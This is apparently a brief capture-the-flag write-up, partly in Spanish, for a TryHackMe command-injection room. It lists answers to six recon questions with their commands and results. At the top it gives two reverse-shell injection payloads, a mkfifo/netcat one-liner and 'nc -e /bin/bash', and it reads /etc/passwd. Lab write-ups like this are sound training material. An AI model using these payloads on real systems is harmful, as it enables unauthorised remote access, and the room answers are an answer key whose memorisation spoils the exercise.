# TryHackMe-Injection

reverse shell

; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 1234 >/tmp/f
  
o simplemente
  
;nc -e /bin/bash
  
1)What strange text file is in the website root directory? 
  
  ls
  
  el archivo es drpepper.txt
  
2) How many non-root/non-service/non-daemon users are there?
  
  cat /etc/passwd
  
  0
  
3)What user is this app running as?
  
  whoami
  
  www-data
  
4)What is the user's shell set as?
  
  awk -F: -v user="www-data" '$1 == user {print $NF}' /etc/passwd
  
  /usr/sbin/nologin
  
5) What version of Ubuntu is running?

  lsb_release -a
  
  18.04.4
  
6) Print out the MOTD.  What favorite beverage is shown?
  
    cat /etc/update-motd.d/00-header (este lo busqué porque no tenía idea de como hacerlo)
  
    DR PEPPER 

